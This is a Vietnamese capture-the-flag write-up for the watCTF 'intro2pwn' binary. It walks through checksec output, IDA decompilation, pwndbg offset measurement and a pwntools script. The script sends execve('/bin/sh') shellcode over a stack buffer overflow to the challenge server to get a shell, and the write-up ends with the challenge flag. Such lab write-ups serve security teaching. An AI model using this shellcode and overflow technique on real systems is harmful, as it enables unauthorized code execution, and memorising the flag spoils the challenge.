# CHALLENGE
- intro2pwn
## SOLUTION
Dùng GDB để debug
1. Kiểm tra checksec
```
File:     /media/sf_CTF/CTF/watCTF/pwn/vuln
Arch:     amd64
RELRO:      No RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```
Stack executable có nghĩa là stack có thể thực thi lệnh được 

2. Kiểm tra hàm vuln bằng ida64
```
__int64 vuln()
{
  char v1; // [sp+0h] [bp-50h]@1

  _printf_chk(2LL, 4829228LL, &v1);
  fflush(stdout);
  _isoc99_scanf(4837114LL, &v1);
  return 0LL;
}
```
Input và output đề bắt đầu tại cùng 1 địa chỉ trên stack và mỗi khi compile thì output sẽ in ra 1 địa chỉ trên stack khác nhau => ASLR enable
3. Tính khoảng cách giữa vị trí bắt đầu của buffer và rip 
```
pwndbg> disassemble vuln
Dump of assembler code for function vuln:
   0x00000000004018d0 <+0>:     push   rbp
   0x00000000004018d1 <+1>:     mov    esi,0x49b02c
   0x00000000004018d6 <+6>:     mov    edi,0x2
   0x00000000004018db <+11>:    xor    eax,eax
   0x00000000004018dd <+13>:    mov    rbp,rsp
   0x00000000004018e0 <+16>:    push   rbx
   0x00000000004018e1 <+17>:    lea    rbx,[rbp-0x50]
   0x00000000004018e5 <+21>:    mov    rdx,rbx
   0x00000000004018e8 <+24>:    sub    rsp,0x48
   0x00000000004018ec <+28>:    call   0x426ef0 <__printf_chk>
   0x00000000004018f1 <+33>:    mov    rdi,QWORD PTR [rip+0xc4ef8]        # 0x4c67f0 <stdout>
   0x00000000004018f8 <+40>:    call   0x40dfc0 <fflush>
   0x00000000004018fd <+45>:    mov    rsi,rbx
   0x0000000000401900 <+48>:    mov    edi,0x49cefa
   0x0000000000401905 <+53>:    xor    eax,eax
   0x0000000000401907 <+55>:    call   0x404ba0 <__isoc99_scanf>
   0x000000000040190c <+60>:    mov    rbx,QWORD PTR [rbp-0x8]
   0x0000000000401910 <+64>:    leave
   0x0000000000401911 <+65>:    xor    eax,eax
   0x0000000000401913 <+67>:    xor    edx,edx
   0x0000000000401915 <+69>:    xor    esi,esi
   0x0000000000401917 <+71>:    xor    edi,edi
   0x0000000000401919 <+73>:    ret
End of assembler dump.
pwndbg> b* 0x0000000000401907
Breakpoint 1 at 0x401907
pwndbg> b* 0x0000000000401919
Breakpoint 2 at 0x401919
pwndbg> 
```
Đặt breakpoint tại scanf và ret sau đó run thì ta được địa chỉ bắt đầu của buffer là 0x7fffffffdce0 và địa chỉ của ret là 0x7fffffffdd38
```
────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────
 ► 0x401907 <vuln+55>        call   __isoc99_scanf              <__isoc99_scanf>
        format: 0x49cefa ◂— 0x73206f6e20007325 /* '%s' */
        rsi: 0x7fffffffdce0 ◂— 0xf
 
   0x40190c <vuln+60>        mov    rbx, qword ptr [rbp - 8]
   0x401910 <vuln+64>        leave  
   0x401911 <vuln+65>        xor    eax, eax                     EAX => 0
   0x401913 <vuln+67>        xor    edx, edx                     EDX => 0
   0x401915 <vuln+69>        xor    esi, esi                     ESI => 0
   0x401917 <vuln+71>        xor    edi, edi                     EDI => 0
b+ 0x401919 <vuln+73>        ret    
 
   0x40191a                  nop    word ptr [rax + rax]
   0x401920 <call_fini>      endbr64 
   0x401924 <call_fini+4>    push   rbp
```
```
  0x401910 <vuln+64>                       leave  
   0x401911 <vuln+65>                       xor    eax, eax     EAX => 0
   0x401913 <vuln+67>                       xor    edx, edx     EDX => 0
   0x401915 <vuln+69>                       xor    esi, esi     ESI => 0
   0x401917 <vuln+71>                       xor    edi, edi     EDI => 0
 ► 0x401919 <vuln+73>                       ret                                <main+11>
    ↓
   0x40175b <main+11>                       xor    eax, eax     EAX => 0
   0x40175d <main+13>                       pop    rbp          RBP => 0x7fffffffdde0
   0x40175e <main+14>                       ret                                <__libc_start_call_main+104>
    ↓
   0x401e28 <__libc_start_call_main+104>    mov    edi, eax     EDI => 0
   0x401e2a <__libc_start_call_main+106>    call   exit                        <exit>
──────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd38 —▸ 0x40175b (main+11) ◂— xor eax, eax
01:0008│     0x7fffffffdd40 —▸ 0x7fffffffdde0 —▸ 0x7fffffffde30 ◂— 0
02:0010│     0x7fffffffdd48 —▸ 0x401e28 (__libc_start_call_main+104) ◂— mov edi, eax
03:0018│     0x7fffffffdd50 ◂— 0
04:0020│     0x7fffffffdd58 —▸ 0x7fffffffde58 —▸ 0x7fffffffe1cf ◂— '/media/sf_CTF/CTF/watCTF/pwn/vuln'
05:0028│     0x7fffffffdd60 ◂— 0x1004cd2b0
06:0030│     0x7fffffffdd68 —▸ 0x401750 (main) ◂— push rbp
07:0038│     0x7fffffffdd70 ◂— 1
──────────────────────────────────────
```
Tính khoảng cách bằng ret-buffer=88 

Vậy payload=Shellcode + 88-len(shellcode) + leak_buf
```
from pwn import *

# r = process('./vuln')
r=remote("challs.watctf.org", 1991)

#leak address
r.recvuntil(b'Addr: ')
leaked_buf=int(r.recvline().strip(),16)
print(f'Leakbuf: {hex(leaked_buf)}')
shellcode = b'\x48\x31\xFF\x57\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05'
payload  = shellcode
payload += b"A" * (0x50 - len(shellcode))  # fill buffer
payload += b"B" * 8                        # overwrite saved RBP
payload += p64(leaked_buf)     

r.sendline(payload)
r.interactive()
```
## flag 
watctf{g00d_j0b_s0m3t1m3s_on_old_machines_this_1s_3n0ugh}

